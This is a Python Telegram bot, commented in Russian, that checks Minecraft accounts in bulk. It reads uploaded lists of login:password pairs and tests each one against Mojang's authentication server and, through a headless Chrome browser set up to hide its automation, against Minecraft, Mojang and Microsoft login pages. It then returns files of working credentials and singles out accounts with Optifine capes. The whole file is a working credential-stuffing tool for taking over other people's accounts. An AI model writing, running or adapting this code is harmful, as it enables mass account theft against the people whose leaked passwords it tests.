import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple
import re
import json

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

import requests

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'capes': 0,
    'migrated': 0,
    'start_time': datetime.now()
}

class SuperChecker:
    """Супер-надежная проверка аккаунтов Minecraft"""
    
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Кэш для ника
        self.username_cache = {}
        
    def setup_driver(self):
        """Настройка Chrome"""
        chrome_options = Options()
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--allow-running-insecure-content')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36')
        
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Путь к ChromeDriver
        chromedriver_path = '/usr/local/bin/chromedriver'
        if not os.path.exists(chromedriver_path):
            chromedriver_path = '/usr/bin/chromedriver'
        
        try:
            service = Service(chromedriver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Ошибка запуска Chrome: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта 3 разными способами"""
        
        # МЕТОД 1: Прямая проверка через Optifine (если логин - ник)
        if re.match(r'^[a-zA-Z0-9_]{2,16}$', login):
            # Проверяем плащ сразу
            has_cape = await self.check_optifine_cape(login)
            if has_cape:
                return {
                    'login': login,
                    'password': password,
                    'username': login,
                    'status': 'valid',
                    'has_cape': True,
                    'method': 'direct_cape'
                }
        
        # МЕТОД 2: Проверка через старый лаунчер (Mojang API)
        mojang_result = await self.check_mojang_api(login, password)
        if mojang_result['status'] == 'valid':
            return mojang_result
        
        # МЕТОД 3: Проверка через сайт с Chrome
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Chrome не запустился'
                }
        
        site_result = await self.check_via_site_with_retry(login, password)
        return site_result
    
    async def check_mojang_api(self, login: str, password: str) -> Dict:
        """Проверка через старый API Mojang"""
        try:
            # Сначала пробуем получить UUID по нику
            if re.match(r'^[a-zA-Z0-9_]{2,16}$', login):
                response = self.session.get(
                    f"https://api.mojang.com/users/profiles/minecraft/{login}",
                    timeout=3
                )
                if response.status_code == 200:
                    data = response.json()
                    uuid = data.get('id')
                    
                    # Пробуем проверить через аутентификацию
                    auth_response = self.session.post(
                        "https://authserver.mojang.com/authenticate",
                        json={
                            "agent": {
                                "name": "Minecraft",
                                "version": 1
                            },
                            "username": login,
                            "password": password
                        },
                        timeout=5
                    )
                    
                    if auth_response.status_code == 200:
                        auth_data = auth_response.json()
                        username = auth_data.get('selectedProfile', {}).get('name', login)
                        
                        # Проверяем плащ
                        has_cape = await self.check_optifine_cape(username)
                        
                        return {
                            'login': login,
                            'password': password,
                            'username': username,
                            'status': 'valid',
                            'has_cape': has_cape,
                            'method': 'mojang_api'
                        }
                    elif 'migrated' in auth_response.text.lower():
                        return {
                            'login': login,
                            'password': password,
                            'status': 'migrated',
                            'error': 'Microsoft (API)'
                        }
            
            return {'status': 'unknown'}
            
        except Exception as e:
            logger.debug(f"Mojang API ошибка: {e}")
            return {'status': 'unknown'}
    
    async def check_via_site_with_retry(self, login: str, password: str) -> Dict:
        """Проверка через сайт с несколькими попытками"""
        
        # Пробуем разные URL
        urls = [
            'https://www.minecraft.net/en-us/login',
            'https://account.mojang.com/login',
            'https://minecraft.net/login',
            'https://login.live.com/login.srf'  # Прямой Microsoft
        ]
        
        for url in urls:
            try:
                result = await self.check_single_url(url, login, password)
                if result['status'] in ['valid', 'migrated', 'invalid']:
                    return result
            except Exception as e:
                logger.debug(f"Ошибка при проверке {url}: {e}")
                continue
        
        # Если ничего не сработало, пробуем через альтернативный метод
        return await self.check_alternative_method(login, password)
    
    async def check_single_url(self, url: str, login: str, password: str) -> Dict:
        """Проверка через конкретный URL"""
        
        try:
            self.driver.get(url)
            
            # Ждем загрузку
            WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            time.sleep(1)
            
            # Проверяем Microsoft
            if 'login.live.com' in self.driver.current_url:
                return {
                    'login': login,
                    'password': password,
                    'status': 'migrated',
                    'error': 'Microsoft'
                }
            
            # Пробуем найти форму входа
            login_success = False
            username_found = None
            
            # Множество селекторов для поля логина
            login_selectors = [
                "input[type='email']",
                "input[name='email']",
                "input[type='text']",
                "#email",
                "#username",
                "#user",
                "input[name='login']",
                "input[placeholder*='email' i]",
                "input[placeholder*='login' i]",
                "input[placeholder*='username' i]"
            ]
            
            # Множество селекторов для поля пароля
            pass_selectors = [
                "input[type='password']",
                "input[name='password']",
                "#password",
                "#pass",
                "input[placeholder*='password' i]"
            ]
            
            # Множество селекторов для кнопки
            button_selectors = [
                "button[type='submit']",
                "input[type='submit']",
                ".login-button",
                "#signin",
                "button:contains('Sign in')",
                "button:contains('Login')",
                "button:contains('Войти')"
            ]
            
            # Ищем поле логина
            login_input = None
            for selector in login_selectors:
                try:
                    login_input = WebDriverWait(self.driver, 2).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    break
                except:
                    continue
            
            if not login_input:
                return {'status': 'unknown', 'url': url}
            
            # Ищем поле пароля
            pass_input = None
            for selector in pass_selectors:
                try:
                    pass_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not pass_input:
                return {'status': 'unknown', 'url': url}
            
            # Ищем кнопку
            submit_button = None
            for selector in button_selectors:
                try:
                    submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            # Вводим данные
            login_input.clear()
            login_input.send_keys(login)
            time.sleep(0.5)
            
            pass_input.clear()
            pass_input.send_keys(password)
            time.sleep(0.5)
            
            # Отправляем форму
            if submit_button:
                submit_button.click()
            else:
                # Пробуем Enter
                pass_input.submit()
            
            # Ждем результат
            time.sleep(3)
            
            # Проверяем результат
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title.lower()
            
            # Критерии успешного входа
            success_indicators = [
                'dashboard' in current_url,
                'profile' in current_url,
                'minecraft.net' in current_url and 'login' not in current_url,
                'account' in current_url,
                'my-account' in current_url,
                'session' in current_url,
                'welcome' in page_source,
                'hi,' in page_source,
                'hello' in page_source,
                'logout' in page_source,
                'sign out' in page_source,
                'profile' in page_title,
                'account' in page_title
            ]
            
            if any(success_indicators):
                # Получаем ник
                username = await self.extract_username_fast()
                
                # Проверяем плащ
                has_cape = await self.check_optifine_cape(username)
                
                return {
                    'login': login,
                    'password': password,
                    'username': username,
                    'status': 'valid',
                    'has_cape': has_cape,
                    'method': 'site'
                }
            
            # Microsoft редирект
            if 'login.live.com' in current_url or 'microsoft' in page_source:
                return {
                    'login': login,
                    'password': password,
                    'status': 'migrated',
                    'error': 'Microsoft'
                }
            
            # Ошибка входа
            error_indicators = [
                'error' in page_source,
                'invalid' in page_source,
                'incorrect' in page_source,
                'wrong' in page_source,
                'failed' in page_source
            ]
            
            if any(error_indicators):
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Invalid credentials'
                }
            
            return {'status': 'unknown', 'url': url}
            
        except TimeoutException:
            return {'status': 'unknown', 'error': 'timeout'}
        except Exception as e:
            logger.debug(f"Ошибка в check_single_url: {e}")
            return {'status': 'unknown', 'error': str(e)}
    
    async def check_alternative_method(self, login: str, password: str) -> Dict:
        """Альтернативный метод проверки"""
        try:
            # Пробуем через прямой запрос к Microsoft
            ms_login = login.replace('@', '%40')
            
            # Имитируем запрос из лаунчера
            headers = {
                'User-Agent': 'Minecraft Launcher',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            
            # Пробуем получить токен
            auth_data = {
                "agent": {
                    "name": "Minecraft",
                    "version": 1
                },
                "username": login,
                "password": password,
                "clientToken": "client",
                "requestUser": True
            }
            
            response = self.session.post(
                "https://authserver.mojang.com/authenticate",
                json=auth_data,
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                username = data.get('selectedProfile', {}).get('name', 'unknown')
                
                # Проверяем плащ
                has_cape = await self.check_optifine_cape(username)
                
                return {
                    'login': login,
                    'password': password,
                    'username': username,
                    'status': 'valid',
                    'has_cape': has_cape,
                    'method': 'authserver'
                }
            elif response.status_code == 403 and 'migrated' in response.text.lower():
                return {
                    'login': login,
                    'password': password,
                    'status': 'migrated',
                    'error': 'Microsoft'
                }
            else:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': f'HTTP {response.status_code}'
                }
                
        except Exception as e:
            logger.debug(f"Альтернативный метод ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    async def extract_username_fast(self) -> str:
        """Быстрое извлечение ника"""
        try:
            # Сначала пробуем простые селекторы
            selectors = [
                ".profile-name",
                ".username",
                ".gamertag",
                ".user-info",
                "[data-username]",
                ".account-name",
                ".player-name",
                ".minecraft-username"
            ]
            
            for selector in selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.text and 2 < len(el.text) < 20:
                            return el.text.strip()
                except:
                    pass
            
            # Пробуем через localStorage
            username = self.driver.execute_script("""
                return localStorage.getItem('username') || 
                       localStorage.getItem('user') || 
                       localStorage.getItem('minecraftUsername') ||
                       localStorage.getItem('playerName') ||
                       document.cookie.match(/user=([^;]+)/)?.[1] ||
                       document.cookie.match(/username=([^;]+)/)?.[1] ||
                       'unknown';
            """)
            
            if username and username != 'unknown':
                return username
            
            # Пробуем найти в тексте страницы
            body_text = self.driver.find_element(By.TAG_NAME, "body").text
            # Ищем что похоже на ник (латинские буквы, цифры, _)
            import re
            matches = re.findall(r'\b[a-zA-Z0-9_]{3,16}\b', body_text)
            if matches:
                # Берем самое часто встречающееся слово
                from collections import Counter
                counter = Counter(matches)
                most_common = counter.most_common(1)
                if most_common:
                    return most_common[0][0]
            
            return "unknown"
        except:
            return "unknown"
    
    async def check_optifine_cape(self, username: str) -> bool:
        """Проверка плаща Optifine"""
        if not username or username == 'unknown':
            return False
        
        try:
            # Пробуем разные варианты URL
            urls = [
                f"https://optifine.net/capes/{username}.png",
                f"http://optifine.net/capes/{username}.png",
                f"https://s.optifine.net/capes/{username}.png"
            ]
            
            for url in urls:
                response = self.session.get(url, timeout=3, stream=True)
                if response.status_code == 200:
                    size = len(response.content)
                    if size > 500:  # Нормальный плащ
                        logger.info(f"🔥 Найден плащ у {username}")
                        return True
            return False
        except Exception as e:
            logger.debug(f"Ошибка проверки плаща: {e}")
            return False
    
    def close(self):
        """Закрытие Chrome"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

# Создаем экземпляр
checker = SuperChecker()

async def process_file(file_path, update, context):
    """Обработка файла"""
    results = {
        'valid': [],
        'capes': [],
        'invalid': [],
        'migrated': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю супер-проверку...**\n"
        "⚡️ Будет проверено 3 разными способами"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Пробуем все возможные разделители
            for sep in [':', ';', '|', '\t', ' ']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Проверяю 3 методами...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['capes'])}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка всеми методами
            result = await checker.check_account(login, password)
            
            # Логируем результат
            logger.info(f"Аккаунт {login[:20]}: {result['status']} (метод: {result.get('method', 'unknown')})")
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['capes'].append(result)
                    bot_stats['capes'] += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['migrated'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Небольшая задержка
            await asyncio.sleep(0.5)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с плащами
        if results['capes']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['capes'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n\n")
                for acc in results['capes']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc.get('username', 'неизвестно')}\n"
                        f"Метод: {acc.get('method', 'unknown')}\n"
                        f"{'='*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Плащей: {len(results['capes'])}**"
                )
            os.remove(cape_file)
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с Microsoft
        if results['migrated']:
            ms_file = f"🔄_MICROSOFT_{len(results['migrated'])}шт_{timestamp}.txt"
            async with aiofiles.open(ms_file, 'w', encoding='utf-8') as f:
                for acc in results['migrated']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(ms_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=ms_file,
                    caption=f"🔄 **Microsoft: {len(results['migrated'])}**"
                )
            os.remove(ms_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['capes'])}\n"
            f"• ❌ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 Microsoft: {len(results['migrated'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Super Minecraft Checker**\n\n"
        f"🔍 **Проверка 3 методами:**\n"
        f"1️⃣ Прямая проверка Optifine\n"
        f"2️⃣ Mojang API\n"
        f"3️⃣ Браузерная эмуляция\n\n"
        f"📥 **Отправь .txt файл**\n"
        f"с логин:пароль\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено плащей: {bot_stats['capes']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Битых: {bot_stats['invalid']}\n"
            f"🔥 С плащами: {bot_stats['capes']}\n"
            f"🔄 Microsoft: {bot_stats['migrated']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@gmail.com:pass123`\n"
            "`Steve:123456`\n\n"
            "⚡️ **Особенности:**\n"
            "• Проверка 3 разными методами\n"
            "• Находит даже проблемные аккаунты\n"
            "• Определяет Microsoft автоматически"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Начинаю супер-проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА!")
        return
    
    print("=" * 50)
    print("🚀 ЗАПУСК SUPER CHECKER")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ РАБОТАЕТ!")
    
    try:
        app.run_polling()
    finally:
        checker.close()

if __name__ == '__main__':
    main()